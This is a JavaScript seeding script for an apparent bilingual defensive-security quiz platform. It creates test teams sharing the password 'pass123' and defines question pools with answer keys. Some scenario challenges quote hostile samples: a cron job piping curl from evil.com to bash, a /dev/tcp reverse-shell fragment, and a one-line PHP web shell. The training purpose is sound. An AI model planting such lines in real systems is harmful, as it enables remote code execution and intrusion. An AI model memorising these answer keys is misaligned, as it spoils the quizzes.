const { run, get, all } = require('./models/database');
const bcrypt = require('bcryptjs');

async function createTestTeams() {
  console.log('Creating test teams...');
  const teams = [
    { name: 'Team Alpha', members: ['alpha_m1', 'alpha_m2', 'alpha_m3', 'alpha_m4', 'alpha_m5'] },
    { name: 'Team Beta', members: ['beta_m1', 'beta_m2', 'beta_m3', 'beta_m4', 'beta_m5'] },
    { name: 'Team Gamma', members: ['gamma_m1', 'gamma_m2', 'gamma_m3', 'gamma_m4', 'gamma_m5'] }
  ];
  const password = await bcrypt.hash('pass123', 10);
  for (const team of teams) {
    const existing = await get('SELECT id FROM teams WHERE team_name = ?', [team.name]);
    if (existing) { console.log(`  Team ${team.name} already exists`); continue; }
    const teamCode = 'TEAM-' + Math.random().toString(36).substring(2, 8).toUpperCase();
    const teamResult = await run('INSERT INTO teams (team_name, team_code) VALUES (?, ?)', [team.name, teamCode]);
    const teamId = teamResult.lastID;
    for (let i = 0; i < 5; i++) {
      const m = i + 1;
      const u = await run('INSERT INTO users (username,password,role,team_name,team_id,member_number) VALUES (?,?,?,?,?,?)',
        [team.members[i], password, 'player', team.name, teamId, m]);
      await run('INSERT INTO team_members (team_id,user_id,member_number) VALUES (?,?,?)', [teamId, u.lastID, m]);
    }
    console.log(`  Created ${team.name} with 5 members`);
  }
}

// ============================================================
// PHASE 1: Large Multiple Choice Pool (30+ questions, EN/FR)
// ============================================================
const mcEasy = [
  { t: 'Basic Defense Knowledge', tf: 'Connaissances de base en défense', d: 'Which command can view all running processes in a Linux system?\n\nA) ls\nB) ps\nC) top\nD) netstat', df: 'Quelle commande permet de voir tous les processus sous Linux ?\n\nA) ls\nB) ps\nC) top\nD) netstat', a: 'B', o: 'ls,ps,top,netstat', cat: 'Basic Knowledge', p: 100 },
  { t: 'Log Analysis', tf: 'Analyse de journaux', d: 'Which Linux log stores authentication and SSH login records?\n\nA) /var/log/messages\nB) /var/log/syslog\nC) /var/log/auth.log\nD) /var/log/kern.log', df: 'Quel journal Linux stocke les enregistrements d\'authentification SSH ?\n\nA) /var/log/messages\nB) /var/log/syslog\nC) /var/log/auth.log\nD) /var/log/kern.log', a: 'C', o: '/var/log/messages,/var/log/syslog,/var/log/auth.log,/var/log/kern.log', cat: 'Log Analysis', p: 100 },
  { t: 'HTTPS Purpose', tf: 'Utilité de HTTPS', d: 'Which protocol is used to securely browse websites?\n\nA) HTTP\nB) FTP\nC) HTTPS\nD) SMTP', df: 'Quel protocole permet de naviguer sécurisé sur le web ?\n\nA) HTTP\nB) FTP\nC) HTTPS\nD) SMTP', a: 'C', o: 'HTTP,FTP,HTTPS,SMTP', cat: 'Security Fundamentals', p: 100 },
  { t: 'Firewall Purpose', tf: 'Rôle du pare-feu', d: 'What does a firewall primarily do?\n\nA) Scan for viruses\nB) Block unauthorized network access\nC) Encrypt emails\nD) Manage passwords', df: 'Quel est le rôle principal d\'un pare-feu ?\n\nA) Scanner les virus\nB) Bloquer les accès non autorisés\nC) Chiffrer les emails\nD) Gérer les mots de passe', a: 'B', o: 'Scan viruses,Block access,Encrypt emails,Manage passwords', cat: 'Security Fundamentals', p: 100 },
  { t: 'Packet Capture Tool', tf: 'Outil de capture réseau', d: 'Which tool is used to capture and analyze network packets?\n\nA) Photoshop\nB) Wireshark\nC) Excel\nD) Notepad', df: 'Quel outil capture et analyse les paquets réseau ?\n\nA) Photoshop\nB) Wireshark\nC) Excel\nD) Notepad', a: 'B', o: 'Photoshop,Wireshark,Excel,Notepad', cat: 'Security Fundamentals', p: 100 },
  { t: 'Strong Password', tf: 'Mot de passe fort', d: 'Which is the strongest password?\n\nA) password123\nB) admin\nC) P@ssw0rd!2024\nD) qwerty', df: 'Quel est le mot de passe le plus fort ?\n\nA) password123\nB) admin\nC) P@ssw0rd!2024\nD) qwerty', a: 'C', o: 'password123,admin,P@ssw0rd!2024,qwerty', cat: 'Security Fundamentals', p: 100 },
  { t: 'VPN Meaning', tf: 'Signification VPN', d: 'What does VPN stand for?\n\nA) Virtual Private Network\nB) Very Personal Network\nC) Visual Protected Node\nD) Virtual Public Node', df: 'Que signifie VPN ?\n\nA) Virtual Private Network\nB) Very Personal Network\nC) Visual Protected Node\nD) Virtual Public Node', a: 'A', o: 'Virtual Private Network,Very Personal Network,Visual Protected Node,Virtual Public Node', cat: 'Security Fundamentals', p: 100 },
  { t: 'HTTP Port', tf: 'Port HTTP', d: 'Which port is used by HTTP?\n\nA) 22\nB) 80\nC) 443\nD) 3389', df: 'Quel port est utilisé par HTTP ?\n\nA) 22\nB) 80\nC) 443\nD) 3389', a: 'B', o: '22,80,443,3389', cat: 'Security Fundamentals', p: 100 },
  { t: 'HTTPS Port', tf: 'Port HTTPS', d: 'Which port is used by HTTPS?\n\nA) 80\nB) 443\nC) 22\nD) 8080', df: 'Quel port est utilisé par HTTPS ?\n\nA) 80\nB) 443\nC) 22\nD) 8080', a: 'B', o: '80,443,22,8080', cat: 'Security Fundamentals', p: 100 },
  { t: 'Phishing Definition', tf: 'Définition hameçonnage', d: 'What is phishing?\n\nA) A type of firewall\nB) A social engineering attack to steal credentials\nC) A network protocol\nD) An encryption method', df: 'Qu\'est-ce que l\'hameçonnage ?\n\nA) Un pare-feu\nB) Une attaque d\'ingénierie sociale\nC) Un protocole réseau\nD) Un chiffrement', a: 'B', o: 'Firewall,Social engineering,Protocol,Encryption', cat: 'Security Fundamentals', p: 100 },
  { t: 'Ping Command', tf: 'Commande Ping', d: 'Which command checks network connectivity?\n\nA) ping\nB) ls\nC) cd\nD) cat', df: 'Quelle commande vérifie la connectivité réseau ?\n\nA) ping\nB) ls\nC) cd\nD) cat', a: 'A', o: 'ping,ls,cd,cat', cat: 'Security Fundamentals', p: 100 },
  { t: 'Two-Factor Auth', tf: 'Authentification à deux facteurs', d: 'What is 2FA?\n\nA) Using two passwords\nB) Using two usernames\nC) A second security layer beyond the password\nD) Logging in twice', df: 'Qu\'est-ce que le 2FA ?\n\nA) Deux mots de passe\nB) Deux identifiants\nC) Une couche de sécurité supplémentaire\nD) Se connecter deux fois', a: 'C', o: 'Two passwords,Two usernames,Second layer,Login twice', cat: 'Security Fundamentals', p: 100 },
  { t: 'Ransomware Definition', tf: 'Définition rançongiciel', d: 'What is ransomware?\n\nA) Software that speeds up the computer\nB) Malware that encrypts files and demands payment\nC) A type of firewall\nD) A network monitoring tool', df: 'Qu\'est-ce qu\'un rançongiciel ?\n\nA) Un logiciel qui accélère l\'ordinateur\nB) Un logiciel malveillant qui chiffre les fichiers\nC) Un pare-feu\nD) Un outil de surveillance', a: 'B', o: 'Speed up,Encrypts files,Firewall,Monitoring', cat: 'Security Fundamentals', p: 100 },
  { t: 'Netstat Command', tf: 'Commande Netstat', d: 'Which command shows active network connections on Linux?\n\nA) ls\nB) netstat\nC) echo\nD) pwd', df: 'Quelle commande affiche les connexions réseau actives ?\n\nA) ls\nB) netstat\nC) echo\nD) pwd', a: 'B', o: 'ls,netstat,echo,pwd', cat: 'Security Fundamentals', p: 100 },
  { t: 'DDoS Attack', tf: 'Attaque DDoS', d: 'What is a DDoS attack?\n\nA) A virus that deletes files\nB) Overwhelming a server with traffic\nC) Stealing passwords\nD) Encrypting data for ransom', df: 'Qu\'est-ce qu\'une attaque DDoS ?\n\nA) Un virus qui supprime des fichiers\nB) Submerger un serveur de trafic\nC) Voler des mots de passe\nD) Chiffrer des données', a: 'B', o: 'Virus,Overwhelming traffic,Steal passwords,Ransom', cat: 'Security Fundamentals', p: 100 },
  { t: 'Trojan Definition', tf: 'Définition cheval de Troie', d: 'Which is a Trojan example?\n\nA) Windows Update\nB) Google Chrome\nC) Fake antivirus that steals data\nD) Microsoft Word', df: 'Exemple de cheval de Troie ?\n\nA) Windows Update\nB) Google Chrome\nC) Faux antivirus qui vole des données\nD) Microsoft Word', a: 'C', o: 'Windows Update,Chrome,Fake antivirus,Word', cat: 'Security Fundamentals', p: 100 },
  { t: 'Brute Force Attack', tf: 'Attaque par force brute', d: 'What is a brute force attack?\n\nA) Using physical force on a computer\nB) Trying many passwords to guess the correct one\nC) Sending fake emails\nD) Exploiting a software vulnerability', df: 'Qu\'est-ce qu\'une attaque par force brute ?\n\nA) Forcer physiquement un ordinateur\nB) Essayer plusieurs mots de passe\nC) Envoyer de faux emails\nD) Exploiter une vulnérabilité', a: 'B', o: 'Physical force,Many passwords,Fake emails,Exploit', cat: 'Security Fundamentals', p: 100 },
  { t: 'Least Privilege', tf: 'Moindre privilège', d: 'What is least privilege?\n\nA) Give everyone admin access\nB) Give users only the permissions they need\nC) No one can access anything\nD) Only the CEO has access', df: 'Principe du moindre privilège ?\n\nA) Admin pour tous\nB) Permissions minimales nécessaires\nC) Personne n\'a accès\nD) Seul le PDG a accès', a: 'B', o: 'Admin for all,Minimal permissions,No access,CEO only', cat: 'Security Fundamentals', p: 100 },
  { t: 'Social Engineering', tf: 'Ingénierie sociale', d: 'What is social engineering?\n\nA) Building social networks\nB) Manipulating people to reveal confidential information\nC) Engineering social media platforms\nD) Creating social events', df: 'Qu\'est-ce que l\'ingénierie sociale ?\n\nA) Créer des réseaux sociaux\nB) Manipuler pour révéler des informations\nC) Créer des plateformes sociales\nD) Organiser des événements', a: 'B', o: 'Social networks,Manipulation,Social media,Events', cat: 'Security Fundamentals', p: 100 },
  { t: 'Zero-Day', tf: 'Vulnérabilité zero-day', d: 'What is a zero-day vulnerability?\n\nA) A bug fixed on day zero\nB) A vulnerability unknown to the vendor\nC) A vulnerability that appears on day one\nD) A harmless software glitch', df: 'Qu\'est-ce qu\'une vulnérabilité zero-day ?\n\nA) Un bug corrigé le jour zéro\nB) Une vulnérabilité inconnue de l\'éditeur\nC) Une vulnérabilité qui apparaît au jour 1\nD) Un défaut logiciel inoffensif', a: 'B', o: 'Fixed day zero,Unknown to vendor,Appears day one,Harmless', cat: 'Security Fundamentals', p: 100 },
  { t: 'Encryption Purpose', tf: 'But du chiffrement', d: 'What is the main purpose of encryption?\n\nA) Make data larger\nB) Protect data confidentiality\nC) Delete unnecessary files\nD) Speed up data transfer', df: 'Quel est le but principal du chiffrement ?\n\nA) Agrandir les données\nB) Protéger la confidentialité\nC) Supprimer les fichiers\nD) Accélérer le transfert', a: 'B', o: 'Larger data,Confidentiality,Delete files,Speed up', cat: 'Security Fundamentals', p: 100 },
  { t: 'IDS Function', tf: 'Fonction IDS', d: 'What does an IDS do?\n\nA) Block all traffic\nB) Detect suspicious activity\nC) Encrypt data\nD) Manage user accounts', df: 'Que fait un IDS ?\n\nA) Bloquer tout le trafic\nB) Détecter les activités suspectes\nC) Chiffrer les données\nD) Gérer les comptes', a: 'B', o: 'Block traffic,Detect activity,Encrypt,Manage accounts', cat: 'Security Fundamentals', p: 100 },
  { t: 'SQL Injection', tf: 'Injection SQL', d: 'What is SQL injection?\n\nA) Injecting SQL software\nB) Inserting malicious SQL queries through input fields\nC) Updating SQL server\nD) Creating SQL databases', df: 'Qu\'est-ce que l\'injection SQL ?\n\nA) Injecter un logiciel SQL\nB) Insérer des requêtes SQL malveillantes\nC) Mettre à jour le serveur SQL\nD) Créer des bases SQL', a: 'B', o: 'Inject software,Malicious queries,Update server,Create DB', cat: 'Security Fundamentals', p: 100 },
  { t: 'Malware Types', tf: 'Types de logiciels malveillants', d: 'Which malware replicates without a host file?\n\nA) Virus\nB) Worm\nC) Trojan\nD) Ransomware', df: 'Quel malware se reproduit sans fichier hôte ?\n\nA) Virus\nB) Ver\nC) Cheval de Troie\nD) Rançongiciel', a: 'B', o: 'Virus,Worm,Trojan,Ransomware', cat: 'Security Fundamentals', p: 100 },
  { t: 'Ps Command', tf: 'Commande ps', d: 'Which command lists running processes?\n\nA) ls\nB) ps\nC) cd\nD) rm', df: 'Quelle commande liste les processus en cours ?\n\nA) ls\nB) ps\nC) cd\nD) rm', a: 'B', o: 'ls,ps,cd,rm', cat: 'Security Fundamentals', p: 100 },
];
const mcMedium = [
  { t: 'HTTP Status Code', tf: 'Code statut HTTP', d: 'Which HTTP status code indicates success?\n\nA) 301\nB) 404\nC) 200\nD) 500', df: 'Quel code HTTP indique un succès ?\n\nA) 301\nB) 404\nC) 200\nD) 500', a: 'C', o: '301,404,200,500', cat: 'Security Fundamentals', p: 150 },
  { t: 'SIEM Purpose', tf: 'Rôle du SIEM', d: 'What is the primary purpose of a SIEM system?\n\nA) Encrypt network traffic\nB) Aggregate and analyze security logs\nC) Block all inbound traffic\nD) Manage user passwords', df: 'Quel est le rôle principal d\'un SIEM ?\n\nA) Chiffrer le trafic\nB) Agrégrer et analyser les journaux de sécurité\nC) Bloquer tout le trafic\nD) Gérer les mots de passe', a: 'B', o: 'Encrypt,Aggregate logs,Block traffic,Passwords', cat: 'Security Fundamentals', p: 150 },
  { t: 'XSS Definition', tf: 'Définition XSS', d: 'What does XSS stand for?\n\nA) XML Secure Sockets\nB) Cross-Site Scripting\nC) Extra Secure System\nD) Xtra Security Solution', df: 'Que signifie XSS ?\n\nA) XML Secure Sockets\nB) Cross-Site Scripting\nC) Extra Secure System\nD) Xtra Security Solution', a: 'B', o: 'XML Secure Sockets,Cross-Site Scripting,Extra Secure,Xtra Security', cat: 'Security Fundamentals', p: 150 },
  { t: 'Symmetric Algorithm', tf: 'Algorithme symétrique', d: 'Which is a symmetric algorithm?\n\nA) RSA\nB) AES\nC) SHA-256\nD) DSA', df: 'Quel est un algorithme symétrique ?\n\nA) RSA\nB) AES\nC) SHA-256\nD) DSA', a: 'B', o: 'RSA,AES,SHA-256,DSA', cat: 'Security Fundamentals', p: 150 },
  { t: 'IDS vs IPS', tf: 'IDS vs IPS', d: 'What is the difference between IDS and IPS?\n\nA) IDS detects, IPS prevents\nB) IPS detects, IDS prevents\nC) They are the same\nD) IDS only works on wireless', df: 'Différence entre IDS et IPS ?\n\nA) IDS détecte, IPS empêche\nB) IPS détecte, IDS empêche\nC) Identiques\nD) IDS seulement sans fil', a: 'A', o: 'IDS detects/IPS prevents,IPS detects/IDS prevents,Same,Wireless only', cat: 'Security Fundamentals', p: 150 },
  { t: 'TCP Handshake', tf: 'Poignée de main TCP', d: 'Which flag is set in the first step of a TCP handshake?\n\nA) ACK\nB) FIN\nC) SYN\nD) RST', df: 'Quel flag est dans la première étape de la poignée de main TCP ?\n\nA) ACK\nB) FIN\nC) SYN\nD) RST', a: 'C', o: 'ACK,FIN,SYN,RST', cat: 'Security Fundamentals', p: 150 },
  { t: 'Reverse Proxy', tf: 'Proxy inverse', d: 'What is the purpose of a reverse proxy?\n\nA) Connect to the internet\nB) Forward external requests to internal servers\nC) Reverse DNS lookups\nD) Encrypt outbound traffic', df: 'Rôle d\'un proxy inverse ?\n\nA) Connecter à internet\nB) Transférer les requêtes externes aux serveurs internes\nC) Requêtes DNS inversées\nD) Chiffrer le trafic sortant', a: 'B', o: 'Internet,Forward requests,DNS lookup,Encrypt outbound', cat: 'Security Fundamentals', p: 150 },
  { t: 'Vulnerability Scanner', tf: 'Scanner de vulnérabilités', d: 'Which tool is for vulnerability scanning?\n\nA) Wireshark\nB) Nmap\nC) Nessus\nD) tcpdump', df: 'Quel outil est un scanner de vulnérabilités ?\n\nA) Wireshark\nB) Nmap\nC) Nessus\nD) tcpdump', a: 'C', o: 'Wireshark,Nmap,Nessus,tcpdump', cat: 'Security Fundamentals', p: 150 },
  { t: 'OWASP Top 10', tf: 'OWASP Top 10', d: 'What does the OWASP Top 10 represent?\n\nA) Top 10 best firewalls\nB) Top 10 web application security risks\nC) Top 10 encryption algorithms\nD) Top 10 programming languages', df: 'Que représente l\'OWASP Top 10 ?\n\nA) Les 10 meilleurs pare-feux\nB) Les 10 principaux risques de sécurité web\nC) Les 10 algorithmes de chiffrement\nD) Les 10 langages de programmation', a: 'B', o: 'Firewalls,Risques web,Algorithms,Languages', cat: 'Security Fundamentals', p: 150 },
  { t: 'Worm Behavior', tf: 'Comportement du ver', d: 'Which malware spreads without user interaction?\n\nA) Trojan\nB) Worm\nC) Ransomware\nD) Spyware', df: 'Quel malware se propage sans interaction ?\n\nA) Cheval de Troie\nB) Ver\nC) Rançongiciel\nD) Logiciel espion', a: 'B', o: 'Trojan,Worm,Ransomware,Spyware', cat: 'Security Fundamentals', p: 150 },
  { t: 'Penetration Test', tf: 'Test d\'intrusion', d: 'What is the purpose of a penetration test?\n\nA) Test network speed\nB) Identify vulnerabilities by simulating attacks\nC) Install security software\nD) Train employees', df: 'But d\'un test d\'intrusion ?\n\nA) Tester la vitesse réseau\nB) Identifier les vulnérabilités\nC) Installer des logiciels\nD) Former les employés', a: 'B', o: 'Speed test,Identify vulns,Install software,Training', cat: 'Security Fundamentals', p: 150 },
  { t: 'MITM Attack', tf: 'Attaque MITM', d: 'What is a man-in-the-middle attack?\n\nA) Physically attacking a server\nB) Intercepting communication between two parties\nC) Hacking into a mainframe\nD) Using a proxy server', df: 'Qu\'est-ce qu\'une attaque MITM ?\n\nA) Attaquer physiquement un serveur\nB) Intercepter les communications\nC) Pirater un mainframe\nD) Utiliser un proxy', a: 'B', o: 'Physical attack,Intercept comms,Mainframe hack,Proxy', cat: 'Security Fundamentals', p: 150 },
  { t: 'DNS Port', tf: 'Port DNS', d: 'Which port does DNS use?\n\nA) 25\nB) 53\nC) 110\nD) 143', df: 'Quel port utilise DNS ?\n\nA) 25\nB) 53\nC) 110\nD) 143', a: 'B', o: '25,53,110,143', cat: 'Security Fundamentals', p: 150 },
  { t: 'Honeypot', tf: 'Honeypot', d: 'What is a honeypot?\n\nA) A sweet snack\nB) A decoy system to attract attackers\nC) A type of firewall\nD) An encryption method', df: 'Qu\'est-ce qu\'un honeypot ?\n\nA) Une collation sucrée\nB) Un système leurre pour attirer les attaquants\nC) Un pare-feu\nD) Une méthode de chiffrement', a: 'B', o: 'Snack,Decoy system,Firewall,Encryption', cat: 'Security Fundamentals', p: 150 },
  { t: 'WPA2 Security', tf: 'Sécurité WPA2', d: 'Which protocol secures modern Wi-Fi networks?\n\nA) WEP\nB) WPA2\nC) Bluetooth\nD) SSL', df: 'Quel protocole sécurise les réseaux Wi-Fi modernes ?\n\nA) WEP\nB) WPA2\nC) Bluetooth\nD) SSL', a: 'B', o: 'WEP,WPA2,Bluetooth,SSL', cat: 'Security Fundamentals', p: 150 },
  { t: 'Chmod Purpose', tf: 'Rôle de chmod', d: 'What does chmod do in Linux?\n\nA) Change file ownership\nB) Change file permissions\nC) Create a directory\nD) Check disk space', df: 'Que fait chmod sous Linux ?\n\nA) Changer le propriétaire\nB) Changer les permissions\nC) Créer un répertoire\nD) Vérifier l\'espace disque', a: 'B', o: 'Ownership,Permissions,Directory,Disk space', cat: 'Security Fundamentals', p: 150 },
  { t: 'SSH Port', tf: 'Port SSH', d: 'Which port does SSH use?\n\nA) 23\nB) 22\nC) 21\nD) 25', df: 'Quel port utilise SSH ?\n\nA) 23\nB) 22\nC) 21\nD) 25', a: 'B', o: '23,22,21,25', cat: 'Security Fundamentals', p: 150 },
  { t: 'Drive-by Download', tf: 'Téléchargement furtif', d: 'Which attack exploits unpatched vulnerabilities automatically?\n\nA) Phishing\nB) Drive-by download\nC) Social engineering\nD) Brute force', df: 'Quelle attaque exploite automatiquement les vulnérabilités ?\n\nA) Hameçonnage\nB) Téléchargement furtif\nC) Ingénierie sociale\nD) Force brute', a: 'B', o: 'Phishing,Drive-by,Social eng,Brute force', cat: 'Security Fundamentals', p: 150 },
  { t: 'WAF Purpose', tf: 'Rôle du WAF', d: 'What is the purpose of a Web Application Firewall?\n\nA) Block all web traffic\nB) Filter and monitor HTTP traffic\nC) Encrypt website content\nD) Manage web server logs', df: 'Rôle d\'un pare-feu applicatif Web ?\n\nA) Bloquer tout le trafic\nB) Filtrer le trafic HTTP\nC) Chiffrer le contenu\nD) Gérer les journaux', a: 'B', o: 'Block all,Filter HTTP,Encrypt,Manage logs', cat: 'Security Fundamentals', p: 150 },
  { t: 'Rootkit Function', tf: 'Fonction du rootkit', d: 'What does a rootkit do?\n\nA) Improve system performance\nB) Hide malicious activity from the OS\nC) Encrypt files\nD) Manage network connections', df: 'Que fait un rootkit ?\n\nA) Améliorer les performances\nB) Cacher les activités malveillantes\nC) Chiffrer les fichiers\nD) Gérer les connexions', a: 'B', o: 'Performance,Hide activity,Encrypt,Manage connections', cat: 'Security Fundamentals', p: 150 },
];
const mcHard = [
  { t: 'PKI Revocation', tf: 'Révocation PKI', d: 'What does a Certificate Revocation List contain?\n\nA) All issued certificates\nB) Certificates revoked before expiration\nC) Expired certificates only\nD) Certificate signing requests', df: 'Que contient une liste de révocation de certificats ?\n\nA) Tous les certificats émis\nB) Certificats révoqués avant expiration\nC) Certificats expirés\nD) Demandes de signature', a: 'B', o: 'All issued,Revoked,Expired,Signing requests', cat: 'Security Fundamentals', p: 200 },
  { t: 'SQL Injection Attack', tf: 'Attaque par injection SQL', d: 'Which attack exploits unsanitized input in DB queries?\n\nA) XSS\nB) CSRF\nC) SQL Injection\nD) Buffer Overflow', df: 'Quelle attaque exploite des entrées non filtrées ?\n\nA) XSS\nB) CSRF\nC) Injection SQL\nD) Dépassement de tampon', a: 'C', o: 'XSS,CSRF,SQL Injection,Buffer Overflow', cat: 'Security Fundamentals', p: 200 },
  { t: 'Race Condition', tf: 'Condition de course', d: 'What is a race condition vulnerability?\n\nA) Two processes racing\nB) A timing-based flaw where operations can be exploited\nC) A type of DoS\nD) Competition between tools', df: 'Qu\'est-ce qu\'une condition de course ?\n\nA) Deux processus en course\nB) Une faille temporelle exploitable\nC) Un type de DoS\nD) Compétition entre outils', a: 'B', o: 'Processes racing,Timing flaw,DoS,Competition', cat: 'Security Fundamentals', p: 200 },
  { t: 'ASLR Purpose', tf: 'But de l\'ASLR', d: 'What is the purpose of ASLR?\n\nA) Encrypt memory\nB) Randomize memory addresses to prevent exploits\nC) Allocate more RAM\nD) Scan memory for viruses', df: 'But de l\'ASLR ?\n\nA) Chiffrer la mémoire\nB) Randomiser les adresses mémoire\nC) Allouer plus de RAM\nD) Scanner la mémoire', a: 'B', o: 'Encrypt,Randomize addresses,Allocate RAM,Scan', cat: 'Security Fundamentals', p: 200 },
  { t: 'Post-Exploitation', tf: 'Post-exploitation', d: 'Which is a post-exploitation framework?\n\nA) Nmap\nB) Metasploit\nC) Wireshark\nD) Nikto', df: 'Quel est un framework de post-exploitation ?\n\nA) Nmap\nB) Metasploit\nC) Wireshark\nD) Nikto', a: 'B', o: 'Nmap,Metasploit,Wireshark,Nikto', cat: 'Security Fundamentals', p: 200 },
  { t: 'Digital Forensics', tf: 'Analyse forensique', d: 'What is chain of custody?\n\nA) Physically chain evidence\nB) Document evidence handling from collection to court\nC) Chain computers together\nD) Encrypt forensic data', df: 'Qu\'est-ce que la chaîne de traçabilité ?\n\nA) Enchaîner physiquement les preuves\nB) Documenter la manipulation des preuves\nC) Relier les ordinateurs\nD) Chiffrer les données', a: 'B', o: 'Chain evidence,Document handling,Chain computers,Encrypt', cat: 'Security Fundamentals', p: 200 },
  { t: 'Pass-the-Hash', tf: 'Pass-the-Hash', d: 'What is pass-the-hash?\n\nA) Stealing plaintext passwords\nB) Using NTLM hashes to authenticate\nC) Hashing passwords differently\nD) Cracking password hashes offline', df: 'Qu\'est-ce que Pass-the-Hash ?\n\nA) Voler les mots de passe\nB) Utiliser des hachages NTLM pour s\'authentifier\nC) Hacher les mots de passe différemment\nD) Casser les hachages hors ligne', a: 'B', o: 'Plaintext,NTLM hashes,Different hash,Offline crack', cat: 'Security Fundamentals', p: 200 },
  { t: 'ARP Spoofing', tf: 'Usurpation ARP', d: 'Which protocol is vulnerable to spoofing on local networks?\n\nA) TCP\nB) UDP\nC) ARP\nD) ICMP', df: 'Quel protocole est vulnérable à l\'usurpation ?\n\nA) TCP\nB) UDP\nC) ARP\nD) ICMP', a: 'C', o: 'TCP,UDP,ARP,ICMP', cat: 'Security Fundamentals', p: 200 },
  { t: 'DLL Hijacking', tf: 'Détournement de DLL', d: 'What is DLL hijacking?\n\nA) Deleting system DLLs\nB) Loading a malicious DLL in place of a legitimate one\nC) Encrypting DLL files\nD) Creating new DLL files', df: 'Qu\'est-ce que le détournement de DLL ?\n\nA) Supprimer les DLL système\nB) Charger une DLL malveillante à la place d\'une légitime\nC) Chiffrer les fichiers DLL\nD) Créer des fichiers DLL', a: 'B', o: 'Delete DLLs,Malicious DLL,Encrypt DLL,Create DLL', cat: 'Security Fundamentals', p: 200 },
  { t: 'Kerberos Purpose', tf: 'Rôle de Kerberos', d: 'What is Kerberos primarily used for?\n\nA) Encrypting files\nB) Authentication in network environments\nC) Scanning network ports\nD) Managing firewalls', df: 'À quoi sert principalement Kerberos ?\n\nA) Chiffrer des fichiers\nB) Authentification réseau\nC) Scanner les ports\nD) Gérer les pare-feux', a: 'B', o: 'Encrypt files,Authentication,Port scan,Firewall', cat: 'Security Fundamentals', p: 200 },
  { t: 'Mimikatz Tool', tf: 'Outil Mimikatz', d: 'What is Mimikatz used for?\n\nA) Network scanning\nB) Extracting credentials from Windows memory\nC) Web vulnerability scanning\nD) Packet analysis', df: 'À quoi sert Mimikatz ?\n\nA) Scan réseau\nB) Extraire des identifiants de la mémoire Windows\nC) Scan de vulnérabilités web\nD) Analyse de paquets', a: 'B', o: 'Scan,Extract credentials,Web scan,Packet analysis', cat: 'Security Fundamentals', p: 200 },
  { t: 'YARA Purpose', tf: 'Rôle de YARA', d: 'What is YARA used for?\n\nA) Network traffic analysis\nB) Identifying malware samples based on patterns\nC) Port scanning\nD) Password cracking', df: 'À quoi sert YARA ?\n\nA) Analyse du trafic réseau\nB) Identifier des échantillons de malwares\nC) Scanner les ports\nD) Casser les mots de passe', a: 'B', o: 'Traffic analysis,Malware patterns,Port scanning,Cracking', cat: 'Security Fundamentals', p: 200 },
];

// ============================================================
// PHASE 2: Technical / Practical Challenges Pool (EN/FR)
// ============================================================
const techEasy = [
  { t: 'Brute Force Detection', tf: 'Détection force brute', d: 'Auth logs show 500 failed SSH attempts from 10.0.0.50 followed by a successful login as root. What attack?', a: 'BruteForce', p: 250 },
  { t: 'Crypto Miner', tf: 'Mineur de cryptomonnaie', d: 'CPU at 98%. Process `xmrig` running from /tmp/.cache. What is this?', a: 'CryptoMiner', p: 250 },
  { t: 'Open RDP Port', tf: 'Port RDP ouvert', d: 'Port 3389 is open on a Windows server. What service?', a: 'RDP', p: 250 },
  { t: 'Default Credentials', tf: 'Identifiants par défaut', d: 'MySQL accessible with root and empty password. What is this weakness?', a: 'DefaultCredentials', p: 250 },
  { t: 'Cron Persistence', tf: 'Persistance par cron', d: 'Cron job: `*/5 * * * * curl http://evil.com/shell.sh | bash`. What is the purpose?', a: 'Persistence', p: 250 },
  { t: 'Overly Permissive Firewall', tf: 'Pare-feu trop permissif', d: 'Firewall allows ALL traffic from 0.0.0.0/0 to port 22. What is the risk?', a: 'OverlyPermissive', p: 250 },
  { t: 'Data Exfiltration', tf: 'Exfiltration de données', d: 'Large SMB file transfers to an external IP at 3:00 AM. What is the concern?', a: 'DataExfiltration', p: 250 },
  { t: 'SUID Risk', tf: 'Risque SUID', d: '`/usr/bin/python3` has permissions `-rwsr-xr-x` owned by root. What risk?', a: 'SUIDMisconfiguration', p: 250 },
  { t: 'Malware Download', tf: 'Téléchargement de malware', d: 'Browser history shows visits to evil.com/download.exe followed by system instability. What happened?', a: 'MalwareDownload', p: 250 },
  { t: 'Password Spray', tf: 'Attaque par pulvérisation', d: 'Login attempts with usernames: admin, root, admin1, admin2, all using password "Welcome1". What attack?', a: 'PasswordSpray', p: 250 },
  { t: 'C2 Beacon', tf: 'Balise C2', d: 'Workstation sends periodic 1KB packets to 203.0.113.99 every 60 seconds. What does this suggest?', a: 'C2Communication', p: 250 },
  { t: 'Phishing Email', tf: 'Email d\'hameçonnage', d: 'Email claims to be from CEO asking for urgent wire transfer, reply-to address is different. What attack?', a: 'CEO Fraud', p: 250 },
];
const techMedium = [
  { t: 'Reverse Shell', tf: 'Shell inversé', d: 'Netstat: `10.0.1.15:45678 -> 198.51.100.20:4444`. PID 1820 runs `/bin/bash -i >& /dev/tcp/...`. What is this?', a: 'ReverseShell', p: 300 },
  { t: 'Macro Malware', tf: 'Macro malveillante', d: 'User received invoice.docm. When opened, it spawned powershell -EncodedCommand. What technique?', a: 'MacroMalware', p: 300 },
  { t: 'Scheduled Task Backdoor', tf: 'Tâche planifiée malveillante', d: 'Task "WindowsUpdate" runs certutil to download and execute a script. What is this?', a: 'PersistenceMechanism', p: 300 },
  { t: 'DNS Tunneling', tf: 'Tunnel DNS', d: 'DNS queries to abc123.evil.com, def456.evil.com from one internal IP. What technique?', a: 'DNS Tunneling', p: 300 },
  { t: 'SUID Escalation', tf: 'Élévation SUID', d: 'File `/usr/bin/python3` is owned by root with SUID bit. A standard user can run it. How to exploit?', a: 'SUIDEscalation', p: 300 },
  { t: 'Web Shell', tf: 'Shell web', d: 'File `/uploads/cmd.php` contains `<?php system($_GET["cmd"]); ?>`. What type of backdoor?', a: 'WebShell', p: 300 },
  { t: 'Lateral Movement', tf: 'Mouvement latéral', d: 'Admin user authenticating from WORKSTATION-5 to SERVER-DB over SMB, followed by service creation. What technique?', a: 'LateralMovement', p: 300 },
  { t: 'Registry Run Key', tf: 'Clé de démarrage Registre', d: 'HKLM\\..\\Run contains "Updater" pointing to C:\\Users\\Public\\updater.exe. What is this?', a: 'RegistryRunKey', p: 300 },
  { t: 'Port Scanning', tf: 'Scan de ports', d: 'Inbound connections from 192.168.1.200 to ports 1-1024 in rapid succession. What is happening?', a: 'PortScan', p: 300 },
  { t: 'SSH Backdoor', tf: 'Porte dérobée SSH', d: '`/home/admin/.ssh/authorized_keys` contains a public key not matching any known admin. What does this mean?', a: 'SSHBackdoor', p: 300 },
